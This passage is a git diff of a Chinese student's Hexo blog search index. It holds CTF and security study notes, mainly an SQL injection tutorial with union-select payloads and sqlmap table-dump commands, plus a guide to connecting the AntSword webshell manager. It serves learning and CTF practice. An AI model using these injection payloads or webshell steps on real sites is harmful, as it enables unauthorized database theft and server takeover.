-<h1 id="图片工具"><a href="#图片工具" class="headerlink" title="图片工具"></a>图片工具</h1><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>我最早接触的工具之一，foremost 是一个 控制台程序 ，用于根据页眉，页脚和内部数据结构 恢复文件 。 Foremost 可以处理图像文件，例如由 dd ， Safeback ， Encase 等生成的图像文件，或直接在驱动器上。 页眉和页脚可以由配置文件指定，也可以使用命令行开关指定内置文件类型。</p>
-<p>可以用于分离一些binwalk做不能分离的文件</p>
-<p>foremost在kali linux已经预装。<br><code>apt-get install foremost</code></p>
-<p>直接可以安装完成。</p>
-<p>foremost最常用用法：</p>
-<p><code>foremost -i filename</code></p>
-]]></content>
-      <categories>
-        <category>misc</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>kali</tag>
-        <tag>tool</tag>
+        <tag>黑科技</tag>
       </tags>
   </entry>
   <entry>
@@ -455,70 +230,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入学习</title>
-    <url>/2021/05/23/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>sql注入学习笔记</p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>笔者从完全不懂sql注入开始学习，在广大的互凉网上寻找资源，所以更多内容为搜集到的内容汇总。上传博客的目的是促进自己学习。如果摘抄至某篇博客的内容会附上链接。</p>
-<h1 id="sql注入是什么"><a href="#sql注入是什么" class="headerlink" title="sql注入是什么"></a>sql注入是什么</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p> SQL注入即是指<strong>web应用程序</strong>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<strong>SQL语句</strong>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<strong>数据库服务器</strong>执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
-<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
-<li>广泛性</li>
-<li>隐蔽性</li>
-<li>危害大</li>
-<li>操作方便</li>
-</ol>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对<strong>WEB服务器</strong>进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。</p>
-<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>假设某网站页面显示时URL为<a href="http://www.example.com/?test=123%EF%BC%8C%E6%AD%A4%E6%97%B6URL%E5%AE%9E%E9%99%85%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%A0%E9%80%92%E4%BA%86%E5%80%BC%E4%B8%BA123%E7%9A%84%E5%8F%98%E9%87%8Ftest%EF%BC%8C%E8%BF%99%E8%A1%A8%E6%98%8E%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%BB%93%E6%9E%9C%E3%80%82%E7%94%B1%E6%AD%A4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%9C%A8URL%E4%B8%AD%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%89%A7%E8%A1%8C%E3%80%82%E5%8F%A6%E5%A4%96%EF%BC%8C%E5%9C%A8%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0SQL%E8%AF%AD%E5%8F%A5%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%88%9B%E5%BB%BA%E6%89%80%E9%9C%80%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%8BSQL%E8%AF%AD%E5%8F%A5%E5%9C%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E8%A2%AB%E5%8A%A8%E6%80%81%E7%9A%84%E6%9E%84%E9%80%A0%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9D%A1%E4%BB%B6%E4%BA%A7%E7%94%9F%E4%B8%8D%E5%90%8C%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%EF%BC%8C%E6%AF%94%E5%A6%82%E9%9C%80%E8%A6%81%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E8%A6%81%E6%B1%82%E6%9D%A5%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E3%80%82%E8%BF%99%E6%A0%B7%E7%9A%84%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E5%85%B6%E5%AE%9E%E4%B8%BASQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%95%99%E4%B8%8B%E4%BA%86%E5%BE%88%E5%A4%9A%E7%9A%84%E5%8F%AF%E4%B9%98%E4%B9%8B%E6%9C%BA%E3%80%82">http://www.example.com?test=123，此时URL实际向服务器传递了值为123的变量test，这表明当前页面是对数据库进行动态查询的结果。由此，我们可以在URL中插入恶意的SQL语句并进行执行。另外，在网站开发过程中，开发人员使用动态字符串构造SQL语句，用来创建所需的应用，这种情况下SQL语句在程序的执行过程中被动态的构造使用，可以根据不同的条件产生不同的SQL语句，比如需要根据不同的要求来查询数据库中的字段。这样的开发过程其实为SQL注入攻击留下了很多的可乘之机。</a></p>
-<h1 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h1><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and  1=1，则会推导为string类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。 </p>
-<h3 id="判断方式"><a href="#判断方式" class="headerlink" title="判断方式"></a>判断方式</h3><ol>
-<li>url为 **<a href="https://www.wha1e.cn/text?id=1&#39;**%E6%97%B6">https://www.wha1e.cn/text?id=1&#39;**时</a> 有一个多余的“**’**”使查询错误</li>
-<li>url为 <strong><a href="https://www.wha1e.cn/text?id=1">https://www.wha1e.cn/text?id=1</a> and 1 = 1</strong> 时, 没有报错, 除非在代码处做了限制(不允许有and字符串)</li>
-<li>url为 <strong><a href="https://www.wha1e.cn/text?id=1">https://www.wha1e.cn/text?id=1</a> and 1 = 2</strong> 时, 由于1=2不成立, 也会报错</li>
-</ol>
-<h3 id="注入实例"><a href="#注入实例" class="headerlink" title="注入实例"></a>注入实例</h3><p>在浏览器地址栏输入：<code>learn.me/sql/article.php?id=1</code>，这是一个get型接口，发送这个请求相当于调用一个查询语句：</p>
-<p><code>$sql = &quot;SELECT * FROM article WHERE id =&quot;,$id</code><br>正常情况下，应该返回一个id=1的文章信息。那么，如果在浏览器地址栏输入：<code>learn.me/sql/article.php?id=-1 OR 1 =1</code>，这就是一个SQL注入攻击了，可能会返回所有文章的相关信息。为什么会这样呢？</p>
-<p>这是因为，id = -1永远是false，1=1永远是true，所有整个where语句永远是ture，所以where条件相当于没有加where条件，那么查询的结果相当于整张表的内容</p>
-<p><strong>原文链接：</strong><a href="https://blog.csdn.net/github_36032947/article/details/78442189">https://blog.csdn.net/github_36032947/article/details/78442189</a></p>
-<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>1.检查是否存在注入</p>
-<p><code>and 1=1 返回正确</code></p>
-<p><code>and 1=2 返回错误</code> </p>
-<p>2.猜字段</p>
-<p><code>order by x</code>(x为数字)</p>
-<p>得出字段数</p>
-<p>3.爆数据库名</p>
-<p><code>?id=1 and 1=2 union select 1,database()</code></p>
-<p>得到数据库名称</p>
-<p>4.爆列表</p>
-<p><code>?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#39;sqli&#39;</code>(sqli为数据库名)</p>
-<p><del>因为感觉没有例题空谈无用，所以先去找相对应的题目了。</del></p>
-<p><del>后续更新。。。</del></p>
-<p><strong>我是鸽子王</strong></p>
-<p>不知不觉就拖了几个月，经历了很多，招新工作已经开始展开了，还是一个菜鸡。</p>
-<p>下面附上sqlmap使用教程：</p>
-<h1 id="sqlmap一把梭"><a href="#sqlmap一把梭" class="headerlink" title="sqlmap一把梭"></a>sqlmap一把梭</h1><p>有人说sqlmap没有灵魂，但是不可否认sqlmap的便利性，只要是人就会出错，就会有忘记的点，但是工具不会。</p>
-<p>我从大佬那里取经来的学习过程应该是先学会工具的使用，熟悉其原理，最后可以自己写出相同原理的工具。</p>
-<h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><h3 id="1-可以直接url注入"><a href="#1-可以直接url注入" class="headerlink" title="1.可以直接url注入"></a>1.可以直接url注入</h3><p>1.查询是否存在注入点：</p>
-<p>Windows：<code>py -2 sqlmap.py -u &quot;url/?id=XX&quot;</code><br>Linux：<code>sqlmap -u &quot;url/?id=XX&quot;</code><br>后面全在Linux系统下进行<br>2.查询当前数据库：<br><code>sqlmap -u &quot;url/?id=XX&quot; --current-db</code><br>3.查询指定数据库所拥有的数据表：<br>以数据库名sqli为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli --tables</code><br>3.查询指定数据库所拥有的数据表有哪些列：<br>以数据表名fl4g为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli -T fl4g -columns</code><br>4.查询指定数据库所拥有的数据表的数据列的内容：<br>以数据列名为falg为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli -T fl4g -C flag -dump</code></p>
-<h3 id="2-基于post请求，burp-suite找到注入点，进行注入"><a href="#2-基于post请求，burp-suite找到注入点，进行注入" class="headerlink" title="2.基于post请求，burp suite找到注入点，进行注入"></a>2.基于post请求，burp suite找到注入点，进行注入</h3><p>使用hackbar插件，传入post请求如:id=1</p>
-<p>利用BP抓取返回包，找到注入点，将id=1删除，保存请求包为txt，进行sql注入<br>方法同上，区别在于将“-u”改为“-r”;以绝对路径为”/home/wha1e/1.txt/“为例</p>
-<p>1.查询是否存在注入点：<br>Linux：<code>sqlmap -r /home/wha1e/1.txt/</code><br>后面全在Linux系统下进行<br>2.查询当前数据库：<br><code>sqlmap -r /home/wha1e/1.txt/ --current-db</code><br>3.查询指定数据库所拥有的数据表：<br>以数据库名sqli为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli --tables</code><br>3.查询指定数据库所拥有的数据表有哪些列：<br>以数据表名fl4g为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli -T fl4g -columns</code><br>4.查询指定数据库所拥有的数据表的数据列的内容：<br>以数据列名为falg为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli -T fl4g -C flag -dump</code></p>
-<h3 id="稍有难度的注入"><a href="#稍有难度的注入" class="headerlink" title="稍有难度的注入"></a>稍有难度的注入</h3><h4 id="cookie注入："><a href="#cookie注入：" class="headerlink" title="cookie注入："></a>cookie注入：</h4><p>格式稍微有一点变化，总体流程不变，下面为查询当前数据库的例子：<br><code>sqlmap -u url/? --cookie &quot;id=1&quot; -dbs</code></p>
-<h4 id="使用脚本："><a href="#使用脚本：" class="headerlink" title="使用脚本："></a>使用脚本：</h4><p>在指令行最后输入 :<code>sqlmap -u &quot;url/?id=XX --tamper=XXX.py</code></p>
-<h4 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入:"></a>UA注入:</h4><p>至少需要把等级调到三级</p>
-<p><code>sqlmap -u &quot;url/?id=XX --level 3</code></p>
-<h4 id="referer注入："><a href="#referer注入：" class="headerlink" title="referer注入："></a>referer注入：</h4><p>使用post请求，bp抓包，保存txt。</p>
-<p>命令：<code>sqlmap -r /home/wha1e/1.txt -p referer </code></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>note</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python实操摘录</title>
     <url>/2021/08/05/python%E5%AE%9E%E6%93%8D%E6%91%98%E5%BD%95/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>代码需要多打，于是我在各大平台开始找题目练习</p>
@@ -537,116 +248,6 @@
       <tags>
         <tag>note</tag>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>⛏事情真开心</title>
-    <url>/2021/08/09/%E2%9B%8F%E4%BA%8B%E6%83%85/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>🐋在⛏🔨事情</p>
-<span id="more"></span>
-
-<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>前两天在B站看到一个视频，提到做up主的动力是什么，up的回答是他每隔一段时间都会做几个水视频，这样可以一直保持兴趣，不至于做这一类太无聊。学习确实过于枯燥，如何让自己一直保持兴趣，我觉得偶尔花花时间玩玩黑科技，也是一个不错的选择。既能提升自己的兴趣，保持学习动力，又能学到东西（其实就是装X）。话不多说，直接开🐛</p>
-<h1 id="企业微信健康打卡"><a href="#企业微信健康打卡" class="headerlink" title="企业微信健康打卡"></a>企业微信健康打卡</h1><p><strong>前言</strong></p>
-<p>主要是来自Elli0t的博客，非常感兴趣，也想自己复现一下。并且在询问他本人之后，加入了他的Github项目。</p>
-<p>先附上他的博客链接：</p>
-<p><a href="https://spacey.top/2020/07/12/%E8%87%AA%E5%8A%A8%E5%81%A5%E5%BA%B7%E6%89%93%E5%8D%A1%EF%BD%9CFUCK-jiankangdaka/">https://spacey.top/2020/07/12/%E8%87%AA%E5%8A%A8%E5%81%A5%E5%BA%B7%E6%89%93%E5%8D%A1%EF%BD%9CFUCK-jiankangdaka/</a></p>
-<p>这个人有点不太文明👀，项目的名字都带是₣uck</p>
-<p><strong>复现</strong></p>
-<p>最初我以为这个项目已经很完善了，只要修改一下我的数据就OK了。但现在一看，毕竟是去年暑假的项目，部分填报数据有所改变，需要自己再修改一下。更难受的是自己的编程能力，七百行的代码看起来真的有点崩溃。</p>
-]]></content>
-      <categories>
-        <category>interest</category>
-      </categories>
-      <tags>
-        <tag>黑科技</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于我和kali的安装之路</title>
-    <url>/2021/07/03/%E4%B8%80%E4%B8%AA%E8%B8%A9%E4%BA%86%E5%A4%A7%E5%8D%8A%E5%B9%B4%E7%9A%84%E5%9D%91/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一时重装一时爽，一直重装一直爽</p>
-<span id="more"></span>
-<p>自去年安装好了第一个Linux系统之后就一直有一个困扰我许久的问题–联网。<br>我的第一个Linux系统是Ubuntu，安装简单。但是相较于Ubuntu，我更喜欢专业的kali;因为教程问题，导致安装kali失败N多次，最后在排除法以及仔细阅读了安装时系统提出的问题之后，现在已经可以熟练安装了。<br>迎接安装成功的下一个问题就是断网卡。<br>kali安装时默认net连接自动联网，但是在我有一段时间不使用kali之后，再次开机它就断网卡了。无论我实验网上可以搜集到的各种方法，都无效。于是乎就只有一个办法，重装系统。<br>前几天我的常用kali又又又崩了，出于对内部工具的不舍，不甘心又一次重装，就找了一下PMR帮我用向日葵远端操作一下。结果还是以失败告终。<br>最终问了一下N神，他告诉我这应该是电脑自身的问题，不可以使用VMware挂起，如果要恢复的话就只能使用快照恢复。所以为了避免这种问题，以后我要常备份，不后台挂起。</p>
-]]></content>
-      <categories>
-        <category>operating system</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蚁剑使用</title>
-    <url>/2021/04/15/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>中国蚁剑一把梭</p>
-<span id="more"></span>
-
-<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>官网下载：<a href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a></p>
-<p><a href="https://github.com/AntSwordProject/AntSword-Loader"> AntSword-Loader </a></p>
-<p>下载AntSword 加载器</p>
-<p>（注：安装路径一定要为英文路径）</p>
-<p>打开文件夹，找到AntSword.exe,选择以管理员身份运行；</p>
-<p>选择一个空文件夹初始化，自动下载源码，完成。</p>
-<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>右键–&gt;添加数据</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A81.png?versionId=CAEQDhiBgICp_v3fxhciIDUyYWQwYzhkNDhjODQyNThhOGE5MTliZjhkZDAxMmRl"></p>
-<p>输入网址以及相对路径，连接密码，测试链接成功后保存</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A82.png?versionId=CAEQDhiBgMDcq4TgxhciIDkwOGY0MGVhMWI1YTQwZjRiN2EyNTg0MTk2OTQxN2Q2"></p>
-<p>大功告成！</p>
-<p>（连接方法有很多种，目前处于学习阶段只列出了最简单的方式）</p>
-<h4 id="插件的使用"><a href="#插件的使用" class="headerlink" title="插件的使用"></a>插件的使用</h4><p>它的插件不能直接使用，需要带科学上网。</p>
-<p>下面是科学上网邀请</p>
-<p><a href="https://xtunnel-aff.icu/auth/register?code=T4Ve">https://xtunnel-aff.icu/auth/register?code=T4Ve</a></p>
-<p>后续更新中……</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>tool</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蓝帽杯</title>
-    <url>/2021/04/22/%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ctf 不是全部，只是学习安全的一种的方式！</p>
-<span id="more"></span>
-<h5 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h5><p>在此之前把蓝帽杯看的太重了，以至于没有分配到厉害的师兄难过了一段时间，但最终还是以戏剧收场。等待结果ing</p>
-<h5 id="web滑雪大冒险"><a href="#web滑雪大冒险" class="headerlink" title="web滑雪大冒险"></a>web滑雪大冒险</h5><p>一句话，就是玩</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E6%BB%91%E9%9B%AA%E5%A4%A7%E5%86%92%E9%99%A9.png?versionId=CAEQFRiBgMCKoerTyxciIDU3YjA0OWQ0N2U3NTQxOWRiNjNlYjBmMGI3NzE1N2U5"></p>
-<h4 id="misc冬奥会-is-coming"><a href="#misc冬奥会-is-coming" class="headerlink" title="misc冬奥会_is_coming"></a>misc冬奥会_is_coming</h4><p>打开图片，从文件大小猜测有隐藏文件，打开Kali使用binwalk 分离，获得rar文件，解压获得encode.mp3</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A1.png?versionId=CAEQFRiBgMC3k.rTyxciIDA0MzRhYTU5Y2RiMDQ0ODFiOTkyYmY5OGY1NTA4ZDg3"></p>
-<p>先用winhex查看发现文件尾部有cipher</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A10.png?versionId=CAEQFRiBgMDxk.rTyxciIGVmZDE3MGZiZWQ2YTQ0Njc4OTI0ZmY2MzcxMmQ4MWVj"></p>
-<p>打开kali 使用cat命令获得密文</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A11.png?versionId=CAEQFRiBgMCElOrTyxciIDI3OWFhZDg4MGU5ZjQwZjBhZjA0ZTRiNTg2ODE4YmIy"></p>
-<p>为emoji加密，通过查找猜测为emoji-aes加密，但是找不出密钥，所以继续分析MP3文件</p>
-<p>MP3文件，联想encode编码猜测为mp3stego隐写，联想冬奥会举办时间，2022年2月4日，猜测密码为20220204，获取文件encode.mp3.txt</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A2.png?versionId=CAEQFRiBgMDzl.rTyxciIDQ4NmViZDMzMjM2NDQ5MjNiZDc5NDJiODEzZjNmOGE5"></p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A3.png?versionId=CAEQFRiBgMCKlurTyxciIGUzZmQ4NWIzZTVkNDRkYjc5ODQwNDJkZDA5Y2JiOWEx"></p>
-<p>先替换\x，将编码进行16进制解码，获得一串符号密文</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A7.png?versionId=CAEQFRiBgMD0murTyxciIGZlYmM5ODcwN2M5MzRmZjA5YTVkNWEyY2VhM2ViOGI5"></p>
-<p>查找知道这是wingding加密，通过在线工具解码</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A8.png?versionId=CAEQFRiBgMCrpurTyxciIDhmY2ZhZjgxNjI0NDQzNjJiNWMzNzg0NWYyZjIxNzE2"></p>
-<p>GitHub搜索1cePeak储存库</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A5.png?versionId=CAEQFRiBgMDUmOrTyxciIGVmNzViYThmZDFjYjQ2N2RhNGJmNjM4ZDY0YWViN2Ji"></p>
-<p>本以为直接下载即可获得key，没成想结果如下</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A4.png?versionId=CAEQFRiBgMCNmOrTyxciIDMxNzNjOTU1ZWExMTQ2OWM4MmRiZDg4MDgyZDFhNGNi"></p>
-<p>最后进入post-checkout界面下载获得key</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A6.png?versionId=CAEQFRiBgICimerTyxciIDY0MmMzZmQ2ODNjYjRmNDM4ODEwODE4YWNkYzM2NDlh"></p>
-<p>获得key</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A9.png?versionId=CAEQFRiBgIClnOrTyxciIDliZDJiNGFiODVkYTQ5MzdhZTAwZTQ5ZDgyZjdhNzZj">)</p>
-<p>How_6ad_c0uld_a_1cePeak_be?</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A12.png?versionId=CAEQFRiBgMCNlerTyxciIDczYjdiMmU1ZTgzNDQyODFhY2YxYWI5M2QyYzQ1YmQ5"></p>
-<p>综上，获取flag</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E8%93%9D%E5%B8%BD%E6%9D%AF/%E5%86%AC%E5%A5%A5%E4%BC%9A13.png?versionId=CAEQFRiBgMDGlurTyxciIDY3MjUyM2ViZTVhNTQxMDNiOGUzOTVjYzYyNTFmNDk2"></p>
-<h5 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h5><p>三解，排名82。审核能已过，期待参加第一场线下赛。</p>
-]]></content>
-      <categories>
-        <category>competition</category>
-      </categories>
-      <tags>
-        <tag>write up</tag>
       </tags>
   </entry>
   <entry>
@@ -1991,6 +1592,405 @@
       <tags>
         <tag>note</tag>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入学习</title>
+    <url>/2021/05/23/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>sql注入学习笔记</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>笔者从完全不懂sql注入开始学习，在广大的互凉网上寻找资源，所以更多内容为搜集到的内容汇总。上传博客的目的是促进自己学习。如果摘抄至某篇博客的内容会附上链接。</p>
+<h1 id="sql注入是什么"><a href="#sql注入是什么" class="headerlink" title="sql注入是什么"></a>sql注入是什么</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p> SQL注入即是指<strong>web应用程序</strong>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<strong>SQL语句</strong>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<strong>数据库服务器</strong>执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
+<li>广泛性</li>
+<li>隐蔽性</li>
+<li>危害大</li>
+<li>操作方便</li>
+</ol>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对<strong>WEB服务器</strong>进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>假设某网站页面显示时URL为<a href="http://www.example.com/?test=123%EF%BC%8C%E6%AD%A4%E6%97%B6URL%E5%AE%9E%E9%99%85%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%A0%E9%80%92%E4%BA%86%E5%80%BC%E4%B8%BA123%E7%9A%84%E5%8F%98%E9%87%8Ftest%EF%BC%8C%E8%BF%99%E8%A1%A8%E6%98%8E%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%BB%93%E6%9E%9C%E3%80%82%E7%94%B1%E6%AD%A4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%9C%A8URL%E4%B8%AD%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%89%A7%E8%A1%8C%E3%80%82%E5%8F%A6%E5%A4%96%EF%BC%8C%E5%9C%A8%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0S